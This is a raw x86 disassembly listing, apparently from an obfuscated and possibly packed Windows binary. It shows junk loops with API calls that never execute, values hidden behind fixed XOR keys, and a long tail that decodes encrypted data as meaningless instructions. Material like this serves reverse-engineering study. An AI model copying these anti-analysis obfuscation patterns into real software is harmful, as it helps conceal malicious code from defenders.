  41c554:	mov    DWORD PTR ds:0x42a010,0x1c
  41c55e:	cmp    DWORD PTR ds:0x42a010,0x0
  41c565:	je     0x41c5a5
  41c56b:	cmp    DWORD PTR ds:0x42a010,0x2c
  41c572:	jne    0x41c58b
  41c578:	push   0x5aa3
  41c57d:	push   0x697d
  41c582:	push   DWORD PTR [ebp-0x28]
  41c585:	call   DWORD PTR ds:0x424028
  41c58b:	xor    ecx,ecx
  41c58d:	add    ecx,DWORD PTR ds:0x42a010
  41c593:	dec    ecx
  41c594:	mov    DWORD PTR ds:0x42a010,ecx
  41c59a:	jmp    0x41c55e
  41c59f:	sbb    DWORD PTR ds:0x42a000,ebx
  41c5a5:	push   ebx
  41c5a6:	sbb    eax,ecx
  41c5a8:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41c5af:	and    DWORD PTR ds:0x428020,0x0
  41c5b9:	jmp    0x41c5cb
  41c5be:	mov    ecx,DWORD PTR ds:0x428020
  41c5c4:	inc    ecx
  41c5c5:	mov    DWORD PTR ds:0x428020,ecx
  41c5cb:	cmp    DWORD PTR ds:0x428020,0x19
  41c5d2:	jae    0x41c5fa
  41c5d8:	cmp    DWORD PTR ds:0x428020,0x28
  41c5df:	jne    0x41c5f5
  41c5e5:	push   0x423948
  41c5ea:	push   0x4238ad
  41c5ef:	call   DWORD PTR ds:0x424030
  41c5f5:	jmp    0x41c5be
  41c5fa:	mov    ecx,DWORD PTR [ebp-0x14]
  41c5fd:	push   esi
  41c5fe:	movzx  esi,BYTE PTR ds:0x42a014
  41c605:	sub    esi,DWORD PTR ds:0x429018
  41c60b:	mov    DWORD PTR ds:0x42a014,esi
  41c611:	mov    eax,0x7510893
  41c616:	mov    esi,DWORD PTR ds:0x42a01c
  41c61c:	adc    esi,DWORD PTR ds:0x42a00c
  41c622:	mov    DWORD PTR ds:0x42a01c,esi
  41c628:	xor    ecx,eax
  41c62a:	neg    esi
  41c62c:	mov    esi,0x3272db
  41c631:	push   edi
  41c632:	add    ecx,esi
  41c634:	mov    DWORD PTR ds:0x42b018,0x6b60
  41c63e:	jmp    0x41c662
  41c643:	mov    DWORD PTR ds:0x42b000,0x231b
  41c64d:	mov    dl,BYTE PTR [ebp-0x1]
  41c650:	mov    DWORD PTR ds:0x42a018,0x496a
  41c65a:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  41c661:	inc    ecx
  41c662:	mov    DWORD PTR ds:0x429014,0x116e
  41c66c:	cmp    ecx,0x40
  41c66f:	mov    DWORD PTR ds:0x42a014,0x7e65
  41c679:	jb     0x41c643
  41c67f:	and    edx,DWORD PTR ds:0x428008
  41c685:	mov    edx,DWORD PTR [ebp-0x14]
  41c688:	sbb    DWORD PTR ds:0x429004,0x429010
  41c692:	xor    edx,eax
  41c694:	add    edx,esi
  41c696:	jmp    0x41c829
  41c69b:	mov    DWORD PTR ds:0x429018,0x1f
  41c6a5:	cmp    DWORD PTR ds:0x429018,0x0
  41c6ac:	je     0x41c713
  41c6b2:	cmp    DWORD PTR ds:0x429018,0xf
  41c6b9:	jne    0x41c6dd
  41c6bf:	push   DWORD PTR [ebp-0x20]
  41c6c2:	push   DWORD PTR [ebp-0x10]
  41c6c5:	push   0x45b6
  41c6ca:	push   DWORD PTR [ebp-0x1c]
  41c6cd:	push   0x5bd1
  41c6d2:	push   0x42c008
  41c6d7:	call   DWORD PTR ds:0x424038
  41c6dd:	cmp    DWORD PTR ds:0x429018,0x10
  41c6e4:	jne    0x41c6f7
  41c6ea:	mov    edi,DWORD PTR ds:0x429018
  41c6f0:	dec    edi
  41c6f1:	mov    DWORD PTR ds:0x429018,edi
  41c6f7:	mov    edi,DWORD PTR ds:0x429018
  41c6fd:	dec    edi
  41c6fe:	mov    DWORD PTR ds:0x429018,edi
  41c704:	jmp    0x41c6a5
  41c709:	or     DWORD PTR ds:0x42a000,0x7430
  41c713:	mov    edi,DWORD PTR [ebp+0x8]
  41c716:	mov    DWORD PTR ds:0x428028,0x1e
  41c720:	cmp    DWORD PTR ds:0x428028,0x0
  41c727:	je     0x41c766
  41c72d:	cmp    DWORD PTR ds:0x428028,0x2e
  41c734:	jne    0x41c74a
  41c73a:	push   0x42a008
  41c73f:	push   0x6949
  41c744:	call   DWORD PTR ds:0x42403c
  41c74a:	mov    ecx,DWORD PTR ds:0x428028
  41c750:	dec    ecx
  41c751:	mov    DWORD PTR ds:0x428028,ecx
  41c757:	jmp    0x41c720
  41c75c:	adc    DWORD PTR ds:0x42b00c,0x42c008
  41c766:	mov    ecx,0x8a85
  41c76b:	add    DWORD PTR ds:0x42b000,0x429018
  41c775:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41c77a:	and    DWORD PTR ds:0x428018,0x0
  41c784:	jmp    0x41c796
  41c789:	mov    edi,DWORD PTR ds:0x428018
  41c78f:	inc    edi
  41c790:	mov    DWORD PTR ds:0x428018,edi
  41c796:	cmp    DWORD PTR ds:0x428018,0x1a
  41c79d:	jae    0x41c7d2
  41c7a3:	cmp    DWORD PTR ds:0x428018,0x25
  41c7aa:	jne    0x41c7c0
  41c7b0:	push   0x55c3
  41c7b5:	push   0x423923
  41c7ba:	call   DWORD PTR ds:0x424040
  41c7c0:	jmp    0x41c789
  41c7c5:	movzx  edi,WORD PTR ds:0x42901c
  41c7cc:	sub    DWORD PTR ds:0x42b00c,edi
  41c7d2:	mov    edi,0x3b4b
  41c7d7:	add    cx,di
  41c7da:	movzx  ecx,cx
  41c7dd:	mov    DWORD PTR [ebp-0x10],ecx
  41c7e0:	mov    ecx,DWORD PTR [ebp+0x8]
  41c7e3:	sub    DWORD PTR ds:0x428004,0x4ea
  41c7ed:	movzx  ecx,WORD PTR [ecx+edx*4]
  41c7f1:	add    DWORD PTR ds:0x42b01c,0x42b000
  41c7fb:	xor    ecx,0x8a85
  41c801:	sub    DWORD PTR ds:0x428014,0x428000
  41c80b:	add    ecx,edi
  41c80d:	mov    edi,DWORD PTR [ebp-0x10]
  41c810:	mov    DWORD PTR ds:0x42b004,0x1d90
  41c81a:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  41c821:	movzx  ecx,BYTE PTR ds:0x428010
  41c828:	inc    edx
  41c829:	mov    ecx,DWORD PTR [ebp-0x18]
  41c82c:	cmp    edx,ecx
  41c82e:	mov    DWORD PTR ds:0x429018,0x3a83
  41c838:	jne    0x41c69b
  41c83e:	and    edx,edx
  41c840:	mov    ecx,DWORD PTR [ebp-0x14]
  41c843:	mov    edx,DWORD PTR [ebp+0x10]
  41c846:	add    DWORD PTR ds:0x42c008,0x32e9
  41c850:	xor    ecx,eax
  41c852:	add    ecx,esi
  41c854:	sub    DWORD PTR ds:0x428020,0x428004
  41c85e:	mov    DWORD PTR [edx],ecx
  41c860:	sub    DWORD PTR ds:0x428028,0x1657
  41c86a:	mov    ecx,DWORD PTR [ebp-0x14]
  41c86d:	xor    ecx,eax
  41c86f:	sub    DWORD PTR ds:0x42b01c,0x42c010
  41c879:	add    ecx,esi
  41c87b:	mov    DWORD PTR [ebp-0x20],ecx
  41c87e:	mov    ecx,DWORD PTR ds:0x42a00c
  41c884:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  41c88b:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  41c892:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  41c899:	movzx  ecx,WORD PTR ds:0x42a004
  41c8a0:	mov    ecx,DWORD PTR [ebp-0xc]
  41c8a3:	mov    DWORD PTR [ebp+0x8],ecx
  41c8a6:	mov    DWORD PTR ds:0x42b008,0x111a
  41c8b0:	jmp    0x41cb0e
  41c8b5:	xor    edx,0x5725
  41c8bb:	mov    ecx,DWORD PTR [ebp+0x8]
  41c8be:	mov    edx,DWORD PTR ds:0x42b000
  41c8c4:	add    DWORD PTR ds:0x42b01c,edx
  41c8ca:	mov    edx,DWORD PTR [ebp-0x8]
  41c8cd:	xor    ecx,eax
  41c8cf:	xor    edx,eax
  41c8d1:	sub    ecx,edx
  41c8d3:	sub    ecx,esi
  41c8d5:	and    DWORD PTR ds:0x428000,0x0
  41c8df:	mov    edx,DWORD PTR ds:0x428000
  41c8e5:	inc    edx
  41c8e6:	mov    DWORD PTR ds:0x428000,edx
  41c8ec:	cmp    DWORD PTR ds:0x428000,0xb
  41c8f3:	jne    0x41c904
  41c8f9:	push   0x42390e
  41c8fe:	call   DWORD PTR ds:0x424044
  41c904:	cmp    DWORD PTR ds:0x428000,0xa
  41c90b:	jne    0x41c91e
  41c911:	mov    edx,DWORD PTR ds:0x428000
  41c917:	inc    edx
  41c918:	mov    DWORD PTR ds:0x428000,edx
  41c91e:	cmp    DWORD PTR ds:0x428000,0x15
  41c925:	jb     0x41c8df
  41c92b:	and    DWORD PTR ds:0x429018,0x0
  41c935:	jmp    0x41c949
  41c93a:	xor    edx,edx
  41c93c:	xor    edx,DWORD PTR ds:0x429018
  41c942:	inc    edx
  41c943:	mov    DWORD PTR ds:0x429018,edx
  41c949:	cmp    DWORD PTR ds:0x429018,0x10
  41c950:	jae    0x41c9c2
  41c956:	cmp    DWORD PTR ds:0x429018,0x17
  41c95d:	jne    0x41c976
  41c963:	push   DWORD PTR [ebp-0x24]
  41c966:	push   0x42801c
  41c96b:	push   0x423a44
  41c970:	call   DWORD PTR ds:0x424048
  41c976:	jmp    0x41c93a
  41c97b:	and    DWORD PTR ds:0x42c004,0x0
  41c985:	mov    edx,DWORD PTR ds:0x42c004
  41c98b:	inc    edx
  41c98c:	mov    DWORD PTR ds:0x42c004,edx
  41c992:	cmp    DWORD PTR ds:0x42c004,0x1e
  41c999:	jne    0x41c9af
  41c99f:	push   0x42b018
  41c9a4:	push   0x6f2d
  41c9a9:	call   DWORD PTR ds:0x424014
  41c9af:	cmp    DWORD PTR ds:0x42c004,0x16
  41c9b6:	jb     0x41c985
  41c9bc:	and    DWORD PTR ds:0x42c014,ecx
  41c9c2:	xor    ecx,eax
  41c9c4:	adc    DWORD PTR ds:0x42c01c,0x41e5
  41c9ce:	mov    DWORD PTR [ebp+0x8],ecx
  41c9d1:	and    DWORD PTR ds:0x429010,0x0
  41c9db:	xor    edx,edx
  41c9dd:	xor    edx,DWORD PTR ds:0x429010
  41c9e3:	inc    edx
  41c9e4:	mov    DWORD PTR ds:0x429010,edx
  41c9ea:	cmp    DWORD PTR ds:0x429010,0x4
  41c9f1:	jne    0x41ca1f
  41c9f7:	push   DWORD PTR [ebp-0x14]
  41c9fa:	push   0x42b010
  41c9ff:	push   0x6800
  41ca04:	push   0x42a000
  41ca09:	push   DWORD PTR [ebp-0x10]
  41ca0c:	push   0x5c37
  41ca11:	push   0x63a5
  41ca16:	push   DWORD PTR [ebp-0x1c]
  41ca19:	call   DWORD PTR ds:0x424018
  41ca1f:	cmp    DWORD PTR ds:0x429010,0x3
  41ca26:	jne    0x41ca3b
  41ca2c:	xor    edx,edx
  41ca2e:	add    edx,DWORD PTR ds:0x429010
  41ca34:	inc    edx
  41ca35:	mov    DWORD PTR ds:0x429010,edx
  41ca3b:	cmp    DWORD PTR ds:0x429010,0x1e
  41ca42:	jb     0x41c9db
  41ca48:	and    edx,0x1801
  41ca4e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ca51:	and    DWORD PTR ds:0x42c018,0x0
  41ca5b:	jmp    0x41ca6f
  41ca60:	xor    edx,edx
  41ca62:	add    edx,DWORD PTR ds:0x42c018
  41ca68:	inc    edx
  41ca69:	mov    DWORD PTR ds:0x42c018,edx
  41ca6f:	cmp    DWORD PTR ds:0x42c018,0x1f
  41ca76:	jae    0x41cab1
  41ca7c:	cmp    DWORD PTR ds:0x42c018,0x12
  41ca83:	jne    0x41ca92
  41ca89:	push   DWORD PTR [ebp-0x28]
  41ca8c:	call   DWORD PTR ds:0x42401c
  41ca92:	cmp    DWORD PTR ds:0x42c018,0x11
  41ca99:	jne    0x41caac
  41ca9f:	mov    edx,DWORD PTR ds:0x42c018
  41caa5:	inc    edx
  41caa6:	mov    DWORD PTR ds:0x42c018,edx
  41caac:	jmp    0x41ca60
  41cab1:	mov    edx,DWORD PTR [ebp-0x64]
  41cab4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cabb:	mov    DWORD PTR [ebp-0x64],ecx
  41cabe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cac1:	mov    edx,DWORD PTR [ebp-0x60]
  41cac4:	lea    ecx,[edx+ecx*1+0x5708f5]
  41cacb:	mov    DWORD PTR [ebp-0x60],ecx
  41cace:	mov    ecx,DWORD PTR [ebp+0x8]
  41cad1:	mov    edx,DWORD PTR [ebp-0x5c]
  41cad4:	lea    ecx,[edx+ecx*1+0x5708f4]
  41cadb:	mov    DWORD PTR [ebp-0x5c],ecx
  41cade:	mov    ecx,DWORD PTR [ebp+0x8]
  41cae1:	mov    edx,DWORD PTR [ebp-0x58]
  41cae4:	lea    ecx,[edx+ecx*1+0x5708fb]
  41caeb:	mov    DWORD PTR [ebp-0x58],ecx
  41caee:	mov    ecx,DWORD PTR [ebp+0x8]
  41caf1:	mov    edx,DWORD PTR [ebp-0x54]
  41caf4:	lea    ecx,[edx+ecx*1+0x5708fa]
  41cafb:	mov    DWORD PTR [ebp-0x54],ecx
  41cafe:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb01:	mov    edx,DWORD PTR [ebp-0x50]
  41cb04:	lea    ecx,[edx+ecx*1+0x5708f9]
  41cb0b:	mov    DWORD PTR [ebp-0x50],ecx
  41cb0e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb11:	xor    ecx,eax
  41cb13:	add    ecx,esi
  41cb15:	jne    0x41c8b5
  41cb1b:	jmp    0x41f062
  41cb20:	mov    ecx,DWORD PTR [ebp-0x1c]
  41cb23:	mov    edx,DWORD PTR [ebp-0x8]
  41cb26:	xor    ecx,eax
  41cb28:	xor    edx,eax
  41cb2a:	sub    ecx,edx
  41cb2c:	sub    ecx,esi
  41cb2e:	xor    ecx,eax
  41cb30:	mov    DWORD PTR [ebp-0x1c],ecx
  41cb33:	mov    ecx,DWORD PTR [ebp-0xc]
  41cb36:	mov    DWORD PTR [ebp+0x8],ecx
  41cb39:	jmp    0x41cb6b
  41cb3e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb41:	mov    edx,DWORD PTR [ebp-0x8]
  41cb44:	xor    ecx,eax
  41cb46:	xor    edx,eax
  41cb48:	sub    ecx,edx
  41cb4a:	sub    ecx,esi
  41cb4c:	xor    ecx,eax
  41cb4e:	mov    DWORD PTR [ebp+0x8],ecx
  41cb51:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb54:	mov    edx,DWORD PTR [ebp+0x8]
  41cb57:	imul   edx,edx,0x5708f5
  41cb5d:	xor    ecx,eax
  41cb5f:	add    ecx,esi
  41cb61:	lea    ecx,[ebp+ecx*4-0x64]
  41cb65:	mov    edi,DWORD PTR [ecx]
  41cb67:	add    edx,edi
  41cb69:	mov    DWORD PTR [ecx],edx
  41cb6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cb6e:	xor    ecx,eax
  41cb70:	add    ecx,esi
  41cb72:	jne    0x41cb3e
  41cb78:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb7b:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb82:	mov    dl,BYTE PTR [ebp-0x1]
  41cb85:	cmp    cl,dl
  41cb87:	je     0x41cc60
  41cb8d:	mov    ecx,DWORD PTR [ebp-0x20]
  41cb90:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  41cb97:	mov    edx,DWORD PTR [ebp+0xc]
  41cb9a:	cmp    cl,BYTE PTR [edx]
  41cb9c:	jne    0x41f074
  41cba2:	mov    ecx,DWORD PTR [ebp-0x14]
  41cba5:	mov    edx,DWORD PTR [ebp+0xc]
  41cba8:	movsx  edx,BYTE PTR [edx]
  41cbab:	xor    ecx,eax
  41cbad:	add    ecx,esi
  41cbaf:	cmp    edx,ecx
  41cbb1:	mov    ecx,DWORD PTR [ebp-0xc]
  41cbb4:	mov    DWORD PTR [ebp+0x8],ecx
  41cbb7:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbba:	je     0x421451
  41cbc0:	jmp    0x41cbf5
  41cbc5:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbc8:	mov    edx,DWORD PTR [ebp-0x8]
  41cbcb:	xor    ecx,eax
  41cbcd:	xor    edx,eax
  41cbcf:	sub    ecx,edx
  41cbd1:	sub    ecx,esi
  41cbd3:	xor    ecx,eax
  41cbd5:	mov    DWORD PTR [ebp+0x8],ecx
  41cbd8:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbdb:	mov    edx,DWORD PTR [ebp+0x8]
  41cbde:	xor    ecx,eax
  41cbe0:	imul   edx,edx,0x5708f5
  41cbe6:	add    ecx,esi
  41cbe8:	lea    ecx,[ebp+ecx*4-0x64]
  41cbec:	mov    edi,DWORD PTR [ecx]
  41cbee:	add    edx,edi
  41cbf0:	mov    DWORD PTR [ecx],edx
  41cbf2:	mov    ecx,DWORD PTR [ebp+0x8]
  41cbf5:	xor    ecx,eax
  41cbf7:	add    ecx,esi
  41cbf9:	jne    0x41cbc5
  41cbff:	mov    ecx,DWORD PTR [ebp-0x14]
  41cc02:	mov    edx,DWORD PTR [ebp+0x8]
  41cc05:	xor    ecx,eax
  41cc07:	xor    edx,eax
  41cc09:	add    ecx,esi
  41cc0b:	add    edx,esi
  41cc0d:	cmp    ecx,edx
  41cc0f:	jae    0x41f008
  41cc15:	lea    edx,[ecx-0x3272db]
  41cc1b:	mov    DWORD PTR [ebp-0x18],edx
  41cc1e:	mov    edi,DWORD PTR [ebp-0x18]
  41cc21:	mov    DWORD PTR [ebp-0x24],0x705fd08
  41cc28:	lea    edx,[ebp-0x24]
  41cc2b:	mov    DWORD PTR [ebp-0x10],edx
  41cc2e:	mov    edx,DWORD PTR [ebp-0x10]
  41cc31:	add    DWORD PTR [edx],0x705fa08
  41cc37:	mov    ebx,DWORD PTR [ebp-0x10]
  41cc3a:	xor    edi,eax
  41cc3c:	add    edi,DWORD PTR [ebx]
  41cc3e:	lea    edx,[ebp+ecx*4-0x64]
  41cc42:	mov    ebx,DWORD PTR [edx]
  41cc44:	xor    edi,ebx
  41cc46:	mov    DWORD PTR [edx],edi
  41cc48:	mov    edx,DWORD PTR [ebp+0x8]
  41cc4b:	xor    edx,eax
  41cc4d:	inc    ecx
  41cc4e:	inc    DWORD PTR [ebp-0x18]
  41cc51:	add    edx,esi
  41cc53:	cmp    ecx,edx
  41cc55:	jb     0x41cc1e
  41cc5b:	jmp    0x41f008
  41cc60:	mov    ecx,DWORD PTR [ebp-0xc]
  41cc63:	mov    DWORD PTR [ebp+0x8],ecx
  41cc66:	jmp    0x41cc98
  41cc6b:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc6e:	mov    edx,DWORD PTR [ebp-0x8]
  41cc71:	xor    ecx,eax
  41cc73:	xor    edx,eax
  41cc75:	sub    ecx,edx
  41cc77:	sub    ecx,esi
  41cc79:	xor    ecx,eax
  41cc7b:	mov    DWORD PTR [ebp+0x8],ecx
  41cc7e:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc81:	mov    edx,DWORD PTR [ebp+0x8]
  41cc84:	imul   edx,edx,0x5708f5
  41cc8a:	xor    ecx,eax
  41cc8c:	add    ecx,esi
  41cc8e:	lea    ecx,[ebp+ecx*4-0x64]
  41cc92:	mov    edi,DWORD PTR [ecx]
  41cc94:	add    edx,edi
  41cc96:	mov    DWORD PTR [ecx],edx
  41cc98:	mov    ecx,DWORD PTR [ebp+0x8]
  41cc9b:	jmp    0x41effe
  41cca0:	mov    dl,0xcf
  41cca2:	enter  0x872f,0x27
  41cca6:	imul   ebp,DWORD PTR [edi+0x65],0x1ad7ebdc
  41ccad:	sahf   
  41ccae:	arpl   sp,dx
  41ccb0:	xchg   edi,eax
  41ccb1:	cld    
  41ccb2:	popa   
  41ccb3:	bound  edi,QWORD PTR [edi+ebx*2]
  41ccb6:	bound  esp,QWORD PTR [edx+0x4c]
  41ccb9:	xchg   BYTE PTR [ebp+0x7cdc3921],dl
  41ccbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccc0:	sub    cl,BYTE PTR [ecx+0x11]
  41ccc3:	adc    al,0x86
  41ccc5:	sbb    DWORD PTR [eax+0x6a5edee7],esi
  41cccb:	aam    0xfa
  41cccd:	adc    ah,BYTE PTR [eax+0x67]
  41ccd0:	sbb    BYTE PTR [eax],dh
  41ccd2:	in     eax,0x7
  41ccd4:	jbe    0x41cd32
  41ccd6:	aam    0x8f
  41ccd8:	repnz inc ebp
  41ccda:	xchg   BYTE PTR [edi+0x73],bh
  41ccdd:	sar    dl,0x55
  41cce0:	jno    0x41cc95
  41cce2:	xor    edx,DWORD PTR [eax+0xd]
  41cce5:	push   cs
  41cce6:	mov    esp,0xf33cb72
  41cceb:	js     0x41ccc2
  41cced:	xchg   esi,eax
  41ccee:	data16 adc BYTE PTR [ebx-0x75],dl
  41ccf2:	cli    
  41ccf3:	fisub  WORD PTR [eax+esi*1+0x2]
  41ccf7:	ret    0x8df
  41ccfa:	leave  
  41ccfb:	jecxz  0x41ccfc
  41ccfd:	fadd   QWORD PTR [esi+0x7f622ae9]
  41cd03:	inc    edi
  41cd04:	out    dx,al
  41cd05:	xor    edx,esi
  41cd07:	adc    bh,BYTE PTR [edi+0x3e]
  41cd0a:	xor    eax,0xdff2e5a7
  41cd0f:	sahf   
  41cd10:	test   al,0x2f
  41cd12:	test   bl,cl
  41cd14:	popa   
  41cd15:	cmp    DWORD PTR [ecx+0x672d3b81],esp
  41cd1b:	rcl    bl,cl
  41cd1d:	mov    al,0xce
  41cd1f:	jne    0x41ccf2
  41cd21:	ror    DWORD PTR [ecx],0xf5
  41cd24:	(bad)  
  41cd25:	loope  0x41cd62
  41cd27:	inc    eax
  41cd28:	scas   al,BYTE PTR es:[edi]
  41cd29:	sbb    ecx,DWORD PTR [edi-0x7012d3f1]
  41cd2f:	pop    es
  41cd30:	out    dx,eax
  41cd31:	and    eax,0x64acd4cb
  41cd36:	sahf   
  41cd37:	cli    
  41cd38:	popa   
  41cd39:	out    0x49,al
  41cd3b:	mov    esi,0x8fb02c6
  41cd40:	scas   al,BYTE PTR es:[edi]
  41cd41:	(bad)
  41cd44:	mov    al,ds:0xa86553ff
  41cd49:	jge    0x41cdb9
  41cd4b:	loop   0x41cccd
  41cd4d:	jmp    0x7981:0x3f2f5ca3
  41cd54:	dec    esi
  41cd55:	dec    esi
  41cd56:	loopne 0x41cd89
  41cd58:	pusha  
  41cd59:	in     al,dx
  41cd5a:	(bad)  
  41cd5b:	dec    edx
  41cd5c:	mov    ds:0x8cd38e3f,al
  41cd61:	ror    BYTE PTR [esi],cl
  41cd63:	or     DWORD PTR [esi+0x726f7c7d],0xad82cf9
  41cd6d:	push   es
  41cd6e:	mov    fs,esp
  41cd70:	or     BYTE PTR [edx-0x5b],0x2b
  41cd74:	or     al,0x50
  41cd76:	(bad)  
  41cd77:	jae    0x41cda2
  41cd79:	test   eax,0x935b88c2
  41cd7e:	lods   eax,DWORD PTR ds:[esi]
  41cd7f:	js     0x41cd3c
  41cd81:	mov    al,0xe9
  41cd83:	push   esp
  41cd84:	stos   BYTE PTR es:[edi],al
  41cd85:	or     eax,0x1121c3c0
  41cd8a:	pushf  
  41cd8b:	mov    eax,ds:0xf141b1cf
  41cd90:	lahf   
  41cd91:	push   ebp
  41cd92:	adc    DWORD PTR [eax+0x3829be00],ebp
  41cd98:	and    esi,DWORD PTR [ebx+0x5b964df1]
  41cd9e:	mov    WORD PTR [ecx],es
  41cda0:	ins    DWORD PTR es:[edi],dx
  41cda1:	imul   ebx,DWORD PTR [ebp+0x18f92877],0xffffffbd
  41cda8:	mov    bh,0xe7
  41cdaa:	jmp    0x9ab61f4
  41cdaf:	outs   dx,DWORD PTR ds:[esi]
  41cdb0:	xor    al,0xab
  41cdb2:	in     al,dx
  41cdb3:	or     al,0x11
  41cdb5:	cmp    ah,bh
  41cdb7:	xchg   edx,eax
  41cdb8:	pop    ebp
  41cdb9:	lods   eax,DWORD PTR ds:[esi]
  41cdba:	mov    edi,0x5cebf94e
  41cdbf:	outs   dx,BYTE PTR ds:[esi]
  41cdc0:	cmp    ch,al
  41cdc2:	icebp  
  41cdc3:	add    DWORD PTR [edi+0x120b83da],ecx
  41cdc9:	add    eax,DWORD PTR [ebx+0x65]
  41cdcc:	and    eax,ebx
  41cdce:	xchg   edx,ebx
  41cdd0:	test   eax,0xec611a80
  41cdd5:	(bad)  
  41cdd6:	std    
  41cdd7:	mov    WORD PTR [ebx-0x7a],?
  41cdda:	jg     0x41cd98
  41cddc:	cmc    
  41cddd:	inc    eax
  41cdde:	jl     0x41cdd1
  41cde0:	lods   eax,DWORD PTR ds:[esi]
  41cde1:	repnz sub edx,ebp
  41cde4:	fs and eax,0x9f786e91
  41cdea:	push   es
  41cdeb:	sahf   
  41cdec:	into   
  41cded:	push   ss
  41cdee:	(bad)  
  41cdef:	jp     0x41cd84
  41cdf1:	(bad)  
  41cdf2:	repz rcr DWORD PTR [esi],0xcf
  41cdf6:	push   ebx
  41cdf7:	in     al,0x87
  41cdf9:	pushf  
  41cdfa:	ins    DWORD PTR es:[edi],dx
  41cdfb:	adc    ebp,edi
  41cdfd:	xor    al,0x4d
  41cdff:	add    ecx,esi
  41ce01:	add    eax,0x4f2f06cf
  41ce06:	xor    bh,BYTE PTR [ebp-0x6f]
  41ce09:	xchg   edi,edi
  41ce0b:	mov    DWORD PTR [esi+edi*2+0x7b],ecx
  41ce0f:	pop    ebx
  41ce10:	test   DWORD PTR [eax-0x6d7f39c7],ecx
  41ce16:	mov    ds,WORD PTR [edx+0x60b63e4]
  41ce1c:	pop    ss
  41ce1d:	add    cl,ch
  41ce1f:	cmc    
  41ce20:	xor    edx,DWORD PTR [eax]
  41ce22:	xor    eax,DWORD PTR [eax]
  41ce24:	and    eax,0x4db1b3bd
  41ce29:	repnz pop ecx
  41ce2b:	(bad)  
  41ce2c:	or     esi,eax
  41ce2e:	sub    BYTE PTR [esi],cl
  41ce30:	sub    al,BYTE PTR [edi-0x62]
  41ce33:	pop    ss
  41ce34:	push   esi
  41ce35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce36:	ret    
  41ce37:	jmp    0x41cdd2
  41ce39:	sub    BYTE PTR [ebx],dh
  41ce3b:	outs   dx,DWORD PTR es:[esi]
  41ce3d:	(bad)  
  41ce3e:	call   0xbc4b6531
  41ce43:	jmp    0x28f4:0x59ceafb2
  41ce4a:	into   
  41ce4b:	sbb    ebp,DWORD PTR [ebp+0x7fab4cc5]
  41ce51:	(bad)  [edi]
  41ce53:	xlat   BYTE PTR ds:[ebx]
  41ce54:	fdivr  QWORD PTR [esi]
  41ce56:	sub    dh,ah
  41ce58:	cmp    esp,DWORD PTR [ecx+0x309da862]
  41ce5e:	mov    bh,0x53
  41ce60:	jb     0x41ce80
  41ce62:	mov    ds:0xa59ba159,al
  41ce67:	and    al,0x7f
  41ce69:	mov    ebx,0xe324f5cf
  41ce6e:	(bad)  
  41ce6f:	out    0xdf,al
  41ce71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce72:	sub    eax,0x253fe858
  41ce77:	pop    esp
  41ce78:	xlat   BYTE PTR ds:[ebx]
  41ce79:	fisttp WORD PTR [edx-0x34]
  41ce7c:	stos   DWORD PTR es:[edi],eax
  41ce7d:	mov    ah,0xab
  41ce7f:	dec    edx
  41ce80:	cmp    al,0x4c
  41ce82:	js     0x41ceef
  41ce84:	or     BYTE PTR [edi-0x1b7a353b],dh
  41ce8a:	pop    ebp
  41ce8b:	pop    ebx
  41ce8c:	xchg   esi,eax
  41ce8d:	rol    DWORD PTR [esp+eiz*8],cl
  41ce90:	lods   al,BYTE PTR ds:[esi]
  41ce91:	xor    bh,BYTE PTR fs:[edi-0x5b]
  41ce95:	push   eax
  41ce96:	(bad)  
  41ce98:	(bad)  
  41ce99:	xchg   edi,eax
  41ce9a:	out    dx,eax
  41ce9b:	add    al,0x7c
  41ce9d:	loope  0x41cf05
  41ce9f:	inc    ecx
  41cea0:	sahf   
  41cea1:	loopne 0x41cf20
  41cea3:	xchg   BYTE PTR [eax],dl
  41cea5:	push   0x3a30c4d6
  41ceaa:	ja     0x41ceac
  41ceac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cead:	adc    BYTE PTR [edx],dl
  41ceaf:	scas   eax,DWORD PTR es:[edi]
  41ceb0:	cmc    
  41ceb1:	mov    ebx,?
  41ceb3:	out    dx,eax
  41ceb4:	test   DWORD PTR [ebp+0x49],ecx
  41ceb7:	js     0x41ce4c
  41ceb9:	jge    0x41cee9
  41cebb:	dec    edi
  41cebc:	mov    bl,0xd3
  41cebe:	sahf   
  41cebf:	sbb    al,0xb6
  41cec1:	mov    al,0xca
  41cec3:	cmp    edx,ebp
  41cec5:	xchg   esi,eax
  41cec6:	js     0x41cef0
  41cec8:	retf   0xcb1e
  41cecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cecc:	loope  0x41cf3b
  41cece:	push   eax
  41cecf:	jno    0x41cefe
  41ced1:	mov    ah,0xb6
  41ced3:	out    0xfd,al
  41ced5:	pop    edx
  41ced6:	mov    BYTE PTR [esi-0x5528d67c],bl
  41cedc:	mov    ch,0xc2
  41cede:	loopne 0x41ce73
  41cee0:	jbe    0x41cf4c
  41cee2:	fs test al,0xee
  41cee5:	jne    0x41ce97
  41cee7:	adc    DWORD PTR [ecx],0xffffff98
  41ceea:	arpl   WORD PTR [ecx+ecx*1-0x5cc7e4ac],bp
  41cef1:	dec    ecx
